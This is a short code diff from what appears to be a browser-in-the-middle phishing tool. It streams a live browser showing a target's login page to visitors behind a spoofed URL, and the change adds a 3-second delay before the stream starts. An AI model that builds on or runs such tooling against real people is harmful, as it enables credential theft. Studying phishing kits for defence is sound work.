@@ -399,7 +399,12 @@ fastify.ready(async function(err){
         fastify.io.to(socket.id).emit('push_state', initialSpoofedUrl)
       }, 2000)
       
-      fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
+      // Add buffer delay before starting video stream to ensure crisp rendering
+      setTimeout(() => {
+        console.log(`Starting video stream after buffer period`)
+        fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
+      }, 3000) // 3 second buffer for high-quality rendering
+      
       //console.log(empty_phishbowl)
       empty_phishbowl = await get_browser(target.login_page)
       browsers.push(empty_phishbowl)
